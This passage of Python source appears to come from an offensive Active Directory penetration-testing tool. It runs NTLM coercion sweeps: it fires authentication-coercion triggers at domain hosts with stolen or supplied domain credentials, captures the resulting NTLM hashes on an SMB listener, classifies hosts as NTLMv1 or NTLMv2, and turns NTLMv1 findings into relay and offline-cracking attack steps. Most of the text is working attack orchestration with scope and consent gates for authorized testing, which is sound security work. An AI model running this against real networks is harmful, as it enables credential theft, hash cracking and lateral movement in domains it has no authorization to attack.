    # >=2-reachable / DC-only fallback so a known-NTLM-disabled domain neither
    # shows the misleading OPSEC scope heads-up nor fires any coercion. Same
    # helper + same premium panel as the shared core and the quick win - no
    # duplicated posture-read logic. Observe-don't-infer: only HIGH-confidence
    # DISABLED skips; UNKNOWN / ENABLED / low-confidence fall through unchanged.
    if _ntlm_disabled_by_posture(shell, domain):
        _render_ntlm_disabled_sweep_skip(shell, domain)
        summary["sweep_skipped_reason"] = "ntlm_disabled"
        return summary

    if not getattr(shell, "myip", None):
        print_warning(
            f"[~] Skipping NTLM auth-type sweep in {marked_domain}: no listener IP "
            "available (myip unset)."
        )
        summary["sweep_skipped_reason"] = "no_listener"
        return summary

    reachable = _load_reachable_sweep_ips(shell, domain)
    reachable_count = len(reachable)
    print_info_debug(
        f"[ntlm-capture][sweep] {marked_domain} reachable={reachable_count} "
        f"type={workspace_type or 'unknown'}"
    )

    # The >=2-reachable gate is intrinsic to relay (a victim to coerce-and-relay
    # plus the DC as relay target), so it applies regardless of engagement type
    # or chosen scope. Gate BEFORE prompting — no point offering a scope when
    # relay is structurally infeasible.
    if reachable_count < 2:
        print_info(
            f"[~] Skipping NTLM auth-type sweep in {marked_domain}: relay needs "
            f"at least 2 reachable hosts; only {reachable_count} reachable."
        )
        summary["sweep_skipped_reason"] = "fewer_than_two_reachable"
        # PRESERVE DC-only reporting: NTLMv1-on-DC is reportable on its own,
        # independent of relay feasibility. Run the single-DC classification for
        # ALL engagement types here in Phase 3 so the DC auth-type is always
        # decided in Domain Intelligence and never deferred to a later phase.
        # CTF safety: run_ntlm_auth_type_quick_win self-gates for ctf (it returns
        # early with a persisted "skipped" when workspace_type == "ctf" and fewer
        # than 2 enabled-computer IPs exist), so ctf domains with too few IPs
        # still skip cleanly — but that decision is now made IN PHASE 3.
        print_info(
            f"[*] Running DC-only NTLM auth-type classification in {marked_domain} "
            "(reportable independent of relay feasibility)."
        )
        run_ntlm_auth_type_quick_win(shell, domain)
        return summary

    # Operator scope selection. The engagement type seeds the DEFAULT (ctf ->
    # all reachable; audit -> DCs only) but the operator may CHOOSE either scope
    # or skip. Non-interactive/CI auto-resolves to the type default, so the
    # prior type-driven behaviour is preserved exactly.
    scope_mode = _select_sweep_scope_mode(
        shell,
        domain=domain,
        workspace_type=workspace_type,
        reachable_count=reachable_count,
    )
    if scope_mode is None:
        print_info(
            f"[~] NTLM auth-type sweep skipped by operator in {marked_domain}."
        )
        summary["sweep_skipped_reason"] = "operator_skipped"
        return summary

    candidates = _candidates_for_scope_mode(
        shell, domain, scope_mode=scope_mode, reachable=reachable
    )
    print_info_debug(
        f"[ntlm-capture][sweep] {marked_domain} scope_mode={scope_mode} "
        f"candidates={len(candidates)}"
    )

    if not candidates:
        print_info(
            f"[~] Skipping NTLM auth-type sweep in {marked_domain}: no in-scope "
            "candidate hosts for the chosen scope."
        )
        summary["sweep_skipped_reason"] = "no_candidates"
        return summary

    return _execute_sweep_over_candidates(
        shell,
        domain=domain,
        candidates=candidates,
        scope_mode=scope_mode,
        summary=summary,
    )



def _infer_context_domain(shell: NtlmCaptureShell) -> str | None:
    """Infer the SPN/credential domain from the current shell context.

    Used when the operator supplies an explicit target IP without a domain.
    Prefers the shell's current ``domain``; falls back to the sole known
    domain when ``domains_data`` is unambiguous.
    """

    current = str(getattr(shell, "domain", "") or "").strip()
    domains_data = getattr(shell, "domains_data", {}) or {}
    if current and current in domains_data:
        return current
    if len(domains_data) == 1:
        return next(iter(domains_data))
    if current:
        return current
    return None


def run_check_ntlm_auth(shell: NtlmCaptureShell, args: str) -> None:
    """Coerce a target host to authenticate back and classify NTLMv1 vs NTLMv2.

    Arg shapes:
        check_ntlm_auth <domain> <ip>   explicit SPN/credential domain + target IP
        check_ntlm_auth <ip>            IP only; domain inferred from shell context
        check_ntlm_auth <domain>        domain only; targets that domain's PDC

    Optional flags: ``--socks5 host:port`` (pivot the coercion trigger through a
    SOCKS5 proxy), ``--timeout``, ``--trigger-timeout``, ``--method``.
    """

    parsed = _parse_probe_args(args)
    domain = parsed.domain
    target_ip = parsed.target_ip

    if not domain and target_ip:
        domain = _infer_context_domain(shell)
        if domain:
            print_info_debug(
                "[ntlm-capture] inferred domain from shell context for explicit IP target: "
                f"{mark_sensitive(domain, 'domain')}"
            )

    if not domain:
        print_error(
            "Usage: check_ntlm_auth <domain> <ip> | check_ntlm_auth <ip> | "
            "check_ntlm_auth <domain> [--socks5 host:port] [--timeout=<seconds>] "
            "[--trigger-timeout=<seconds>] [--method=<method_name>]"
        )
        if target_ip:
            print_error(
                "Could not infer a domain for the explicit IP target. Provide it "
                "explicitly: check_ntlm_auth <domain> <ip>."
            )
        return

    result = _execute_ntlm_capture_probe(
        shell,
        domain=domain,
        capture_timeout=parsed.capture_timeout,
        trigger_timeout=parsed.trigger_timeout,
        method_filter=parsed.method_filter,
        target_override=target_ip,
        proxy_spec=parsed.proxy_spec,
    )
    if result is None:
        return

    # An explicit target IP is only the PDC when it matches the domain's known
    # PDC; otherwise the capture panel must not label it as the PDC.
    pdc_ip = str(shell.domains_data.get(domain, {}).get("pdc") or "").strip()
    target_is_pdc = (not target_ip) or (bool(pdc_ip) and target_ip == pdc_ip)
    coercion_source = "PDC coercion" if target_is_pdc else "target coercion"
    if result.success and result.observation:
        marked_user = mark_sensitive(result.observation.raw_user, "user")
        print_success(
            f"[+] Captured {result.auth_type} authentication from {marked_user} via {coercion_source}."
        )
        _render_captured_hash_jackpot(result, domain=domain, target_is_pdc=target_is_pdc)
        return

    if _ntlm_disabled_by_posture(shell, domain):
        _render_ntlm_disabled_finding(domain)
        return

    _render_failed_ntlm_capture_probe(result)
    _render_no_capture_next_steps(result)


def run_check_dc_ntlm_auth_type(shell: NtlmCaptureShell, args: str) -> None:
    """Deprecated alias for :func:`run_check_ntlm_auth` (DC/PDC behaviour).

    Delegates to the generalized verb. With no explicit target IP the
    generalized path falls through to the current domain's PDC, which is the
    exact behaviour this verb has always had. Kept so existing callers, tests,
    and muscle memory keep working.
    """

    run_check_ntlm_auth(shell, args)


def _execute_sweep_over_candidates(
    shell: NtlmCaptureShell,
    *,
    domain: str,
    candidates: list[str],
    scope_mode: str,
    summary: dict[str, Any],
) -> dict[str, Any]:
    """Run the shared-listener coercion fan-out over a known candidate set.

    Single source of truth for the sweep core: the listener bind, bounded
    concurrent coercion fan-out, capture attribution by ``<host>$`` account,
    per-host verdict persistence (``ntlm_auth_type_by_host``), the live/static
    results surface, and the NTLMv1 attack-step materialization. Both the
    file-scoped public entry point (:func:`run_ntlm_auth_type_sweep`) and the
    pre-scoped post-pivot entry point
    (:func:`run_ntlm_auth_type_sweep_for_hosts`) converge here so the fan-out is
    never duplicated. Callers own host selection, the scope consent prompt, and
    the relay gate; this function assumes ``candidates`` is the final, non-empty
    in-scope set and that the >=2-reachable relay gate has already passed.

    Mutates and returns *summary* in place (the caller seeds it with the domain,
    workspace type, and counters).
    """

    # POSTURE GATE (single source of truth). When NTLM is known-disabled
    # domain-wide at HIGH confidence, coercion can neither NTLM-auth its own
    # session to the target (the NOT_SUPPORTED loop) nor make the target emit an
    # NTLM hash - the whole NTLMv1-downgrade premise is void. Skip BEFORE any
    # listener bind or coercion fire. This single gate covers all three entry
    # points (full sweep, the post-pivot sweep, and - via the shared helper - the
    # DC-only quick win) since they all converge here. Observe-don't-infer: only a
    # HIGH-confidence DISABLED skips; UNKNOWN / ENABLED / low-confidence proceed.
    if _ntlm_disabled_by_posture(shell, domain):
        _render_ntlm_disabled_sweep_skip(shell, domain)
        summary["sweep_skipped_reason"] = "ntlm_disabled"
        return summary

    marked_domain = mark_sensitive(domain, "domain")
    host_count = len(candidates)
    concurrency = min(
        _read_int_env(_SWEEP_CONCURRENCY_ENV, _DEFAULT_SWEEP_CONCURRENCY), host_count
    )
    budget_seconds = _read_int_env(_SWEEP_BUDGET_ENV, _DEFAULT_SWEEP_BUDGET_SECONDS)

    print_info(
        f"[*] NTLM auth-type sweep ({scope_mode}) over {host_count} host(s) in "
        f"{marked_domain} (concurrency={concurrency}, budget={budget_seconds}s)."
    )

    listener_ip = str(getattr(shell, "myip", "") or "").strip()
    domain_data = (shell.domains_data or {}).get(domain) or {}
    username = str(domain_data.get("username") or "").strip()
    secret = str(domain_data.get("password") or "").strip()
    if not username or not secret:
        print_warning(
            f"[~] Skipping NTLM auth-type sweep in {marked_domain}: authenticated "
            "domain credentials are required to fire coercion triggers."
        )
        summary["sweep_skipped_reason"] = "no_credentials"
        return summary

    # SHARED-LISTENER FAN-OUT. One listener for the whole sweep; N concurrent
    # coercion triggers fire at it under a bounded thread pool. Each capture is
    # attributed to its coerced host by matching the authenticating ``<host>$``
    # computer account. The single bind removes the EADDRINUSE conflict that
    # previously forced this sweep serial.
    account_to_ip, ip_to_account = _build_sweep_account_index(
        shell, domain, candidates
    )

    import threading  # noqa: PLC0415
    import time  # noqa: PLC0415

    start = time.monotonic()
    fired_ips: set[str] = set()
    fired_lock = threading.Lock()
    budget_exhausted = threading.Event()
    listener = NativeListenerCapture(listen_host=listener_ip)

    def _fire(ip: str) -> str | None:
        # A worker that picks this task up after the global budget is spent must
        # NOT fire (it stays un-fired -> reported as truncated, not silently
        # classified). cancel_futures handles tasks never started; this guards
        # the one a free worker grabs in the same tick the budget expires.
        if budget_exhausted.is_set() or (
            budget_seconds - (time.monotonic() - start) <= 0
        ):
            budget_exhausted.set()
            return None
        trigger = NativeCoercionTrigger()
        # Stop this host's trigger the moment ITS account authenticates back, so
        # one host's catalog walk does not waste the global budget. Empty filter
        # (unknown hostname) lets the trigger walk the full catalog to timeout.
        expected_account = ip_to_account.get(ip) or ""
        capture_signal = listener.make_capture_signal(
            [expected_account] if expected_account else []
        )
        _fire_sweep_coercion(
            shell,
            trigger,
            domain=domain,
            target_ip=ip,
            listener_ip=listener_ip,
            username=username,
            secret=secret,
            capture_signal=capture_signal,
            trigger_timeout=_SWEEP_TRIGGER_TIMEOUT,
        )
        with fired_lock:
            fired_ips.add(ip)
        return ip

    if not listener.start():
        error_code, error_detail = listener.describe_start_error()
        print_warning(
            f"[~] Skipping NTLM auth-type sweep in {marked_domain}: the shared SMB "
            f"capture listener could not start — {error_detail}"
        )
        print_info_debug(
            f"NTLM sweep listener start failure: code={error_code} detail={error_detail}"
        )
        summary["sweep_skipped_reason"] = "listener_start_failed"
        summary["listener_start_error_code"] = error_code
        return summary

    # Live dashboard gate. Only the "all reachable hosts" scope above the
    # threshold gets the premium per-host live classification dashboard; DC-only
    # or small candidate sets keep the existing log output. The dashboard is
    # presentation-only — it reads the same observations and changes nothing
    # about attribution or persistence. A failure to build it (or a non-TTY/CI
    # console) never aborts the sweep: the fan-out proceeds with plain logging.
    dashboard = _maybe_build_sweep_dashboard(
        scope_mode=scope_mode,
        candidates=candidates,
        ip_to_account=ip_to_account,
    )

    try:
        # Brief settle so the listener bind is live before the first coercion.
        time.sleep(_SWEEP_LISTENER_SETTLE_SECONDS)
        observations = _run_sweep_fanout(
            domain=domain,
            candidates=candidates,
            fire=_fire,
            concurrency=concurrency,
            budget_seconds=budget_seconds,
            start=start,
            budget_exhausted=budget_exhausted,
            listener=listener,
            fired_ips=fired_ips,
            fired_lock=fired_lock,
            dashboard=dashboard,
        )
    finally:
        listener.stop()

    # Attribute every captured observation to its coerced host by computer
    # account. A host that fired but produced no matching capture stays unknown.
    verdict_by_ip: dict[str, tuple[str | None, str | None]] = {}
    for obs in observations:
        attributed_ip = account_to_ip.get(str(obs.clean_user or "").casefold())
        if not attributed_ip:
            continue
        version = obs.ntlm_version if obs.ntlm_version in {"NTLMv1", "NTLMv2"} else None
        # First positive classification wins; never downgrade a prior verdict.
        if attributed_ip not in verdict_by_ip or (
            version and verdict_by_ip[attributed_ip][0] is None
        ):
            verdict_by_ip[attributed_ip] = (version, obs.raw_user)

    completed_ips: set[str] = set(fired_ips)
    elapsed = time.monotonic() - start
    # Authoritative per-host verdict rows for the static final results table.
    # Built from the same attribution the persistence loop uses, so the review
    # surface matches exactly what is persisted (single source of truth).
    result_rows: list[dict[str, Any]] = []
    for ip in candidates:
        if ip not in completed_ips:
            continue
        auth_type, captured_user = verdict_by_ip.get(ip, (None, None))
        status = "captured" if auth_type in {"NTLMv1", "NTLMv2"} else "unknown"
        expected_account = ip_to_account.get(ip) or None
        result_rows.append(
            {
                "ip": ip,
                "auth_type": auth_type if auth_type in {"NTLMv1", "NTLMv2"} else "unknown",
                "captured_user": captured_user or expected_account or "",
            }
        )
        _persist_ntlm_host_verdict(
            shell,
            domain=domain,
            ip=ip,
            auth_type=auth_type,
            status=status,
            reason=None if status == "captured" else status,
            expected_account=expected_account,
            captured_user=captured_user,
            elapsed_seconds=elapsed,
        )
        summary["swept_count"] += 1
        marked_host = mark_sensitive(ip, "ip")
        if auth_type == "NTLMv1":
            summary["ntlmv1_found"] += 1
            print_warning(
                f"[!] {marked_host} in {marked_domain} speaks NTLMv1 (downgrade "
                "misconfiguration)."
            )
        elif auth_type == "NTLMv2":
            summary["ntlmv2_found"] += 1
            print_info_debug(
                f"[ntlm-capture][sweep] {marked_host} classified NTLMv2."
            )
        else:
            summary["coercion_unknown"] += 1
            print_info_debug(
                f"[ntlm-capture][sweep] {marked_host} unknown ({status})."
            )

    truncated = [ip for ip in candidates if ip not in completed_ips]
    if truncated:
        summary["truncated_count"] = len(truncated)
        print_warning(
            f"[~] NTLM auth-type sweep hit its {budget_seconds}s budget in "
            f"{marked_domain}: {len(truncated)} host(s) were not classified and "
            "remain unknown (re-run to finish, or raise "
            f"{_SWEEP_BUDGET_ENV})."
        )
        print_info_debug(
            "[ntlm-capture][sweep] truncated hosts: "
            + mark_sensitive(",".join(truncated), "text")
        )

    if hasattr(shell, "save_workspace_data"):
        try:
            shell.save_workspace_data()
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_info_debug(
                "[ntlm-capture][sweep] failed to persist workspace data: "
                f"{mark_sensitive(str(exc), 'detail')}"
            )

    # Materialize the NTLMv1 coerce→relay / offline-crack attack steps into the
    # attack graph from the just-persisted per-host verdicts (the #2→#3 seam).
    # The sweep already wrote ``ntlm_auth_type_by_host``; this turns the NTLMv1
    # finding into a traversable kill chain. Non-destructive, idempotent, and
    # best-effort — it never aborts the sweep.
    _materialize_ntlmv1_attack_steps(shell, domain)

    # Static review-grade results table. The live path printed it via the
    # LiveSession `summary` callback after the alt-screen popped (using the
    # dashboard's own attributed snapshot); print it here only for the no-live
    # path so we never double-print. >=2-host gate is already enforced upstream.
    if dashboard is None:
        _print_sweep_results_table(
            domain=domain, result_rows=result_rows, summary=summary
        )

    print_success(
        f"[+] NTLM auth-type sweep complete in {marked_domain}: "
        f"{summary['swept_count']} swept, {summary['ntlmv1_found']} NTLMv1, "
        f"{summary['ntlmv2_found']} NTLMv2, {summary['coercion_unknown']} unknown."
    )
    return summary


def run_ntlm_auth_type_sweep_for_hosts(
    shell: NtlmCaptureShell,
    domain: str,
    *,
    candidate_ips: list[str],
    scope_mode: str = _SCOPE_MODE_ALL,
) -> dict[str, Any]:
    """Run an NTLM auth-type sweep over an INJECTED, pre-scoped host set.

    Pre-scoped sibling of :func:`run_ntlm_auth_type_sweep` for callers that
    already know exactly which hosts to coerce (e.g. the post-pivot follow-up,
    which scopes to the newly-reachable delta). Bypasses the file-based host
    selection (``_load_reachable_sweep_ips`` / ``_candidates_for_scope_mode``)
    but keeps every other invariant the file-scoped path enforces: the listener
    bind, the OPSEC-relevant >=2-reachable relay gate, bounded concurrency, the
    global budget, per-host verdict persistence, and the NTLMv1 attack-step
    materialization. The shared fan-out lives in
    :func:`_execute_sweep_over_candidates`; this wrapper never duplicates it.

    Args:
        shell: Active ADscan shell.
        domain: SPN/credential domain for the coercion triggers.
        candidate_ips: The exact, already-scoped host IPs to coerce. De-duped
            and order-preserved before the fan-out. The caller is responsible
            for restricting this to the intended delta (e.g. newly-reachable
            hosts only) so already-classified hosts are not re-coerced.
        scope_mode: Reporting/dashboard scope label threaded into the live
            dashboard gate and the result surface. Defaults to ``"all"``.

    Returns:
        The same summary dict shape as :func:`run_ntlm_auth_type_sweep`.
    """

    workspace_type = str(getattr(shell, "type", "") or "").strip().lower()
    marked_domain = mark_sensitive(domain, "domain")

    summary: dict[str, Any] = {
        "domain": domain,
        "workspace_type": workspace_type,
        "swept_count": 0,
        "ntlmv1_found": 0,
        "ntlmv2_found": 0,
        "coercion_unknown": 0,
        "sweep_skipped_reason": None,
        "truncated_count": 0,
    }

    if not getattr(shell, "myip", None):
        print_warning(
            f"[~] Skipping NTLM auth-type sweep in {marked_domain}: no listener IP "
            "available (myip unset)."
        )
        summary["sweep_skipped_reason"] = "no_listener"
        return summary

    # De-duplicate while preserving caller order.
    seen: set[str] = set()
    candidates: list[str] = []
    for raw in candidate_ips or []:
        ip = str(raw or "").strip()
        if ip and ip not in seen:
            seen.add(ip)
            candidates.append(ip)

    if not candidates:
        print_info_debug(
            f"[ntlm-capture][sweep] {marked_domain} pre-scoped sweep had no "
            "candidate hosts after de-duplication; skipping."
        )
        summary["sweep_skipped_reason"] = "no_candidates"
        return summary

    # Relay feasibility is a function of the TOTAL reachable host set for the
    # domain, NOT the size of the newly-reachable delta. A coerce-and-relay chain
    # needs a victim to coerce (here: the newly-reachable delta) PLUS a relay
    # target, and that target may be ANY reachable host — typically the DC or a
    # member that was already reachable BEFORE this pivot — not necessarily a
    # second host inside the delta. Counting only the delta (``len(candidates)``)
    # wrongly skipped a 1-host delta even when valid relay targets were already
    # reachable: a Ligolo pivot surfaces WEB01 (delta=1) while DC01 was reachable
    # all along, so the true reachable set is {WEB01, DC01} = 2 and relay IS
    # feasible. Mirror the file-scoped path (run_ntlm_auth_type_sweep): gate on
    # the total reachable count — the union of the delta and the persisted
    # reachable set, robust to reachability-write lag right after a pivot — and
    # when relay is infeasible STILL classify the DC, since NTLMv1-on-DC is
    # reportable on its own, independent of relay feasibility.
    reachable = _load_reachable_sweep_ips(shell, domain)
    relay_pool = set(candidates) | {ip for ip in (str(r).strip() for r in reachable) if ip}
    if len(relay_pool) < 2:
        print_info(
            f"[~] Skipping coerce-and-relay NTLM sweep over newly-reachable hosts "
            f"in {marked_domain}: relay needs at least 2 reachable hosts "
            f"(victim + target); {len(relay_pool)} reachable in total."
        )
        summary["sweep_skipped_reason"] = "fewer_than_two_reachable"
        # Per-host classification is reportable independent of relay feasibility:
        # mirror the file-scoped path and classify the DC auth-type even when no
        # relay chain can be formed.
        print_info(
            f"[*] Running DC-only NTLM auth-type classification in {marked_domain} "
            "(reportable independent of relay feasibility)."
        )
        run_ntlm_auth_type_quick_win(shell, domain)
        return summary

    return _execute_sweep_over_candidates(
        shell,
        domain=domain,
        candidates=candidates,
        scope_mode=scope_mode,
        summary=summary,
    )


__all__ = [
    "run_check_ntlm_auth",
    "run_check_dc_ntlm_auth_type",
    "run_ntlm_auth_type_quick_win",
    "run_ntlm_auth_type_sweep",
    "run_ntlm_auth_type_sweep_for_hosts",
]
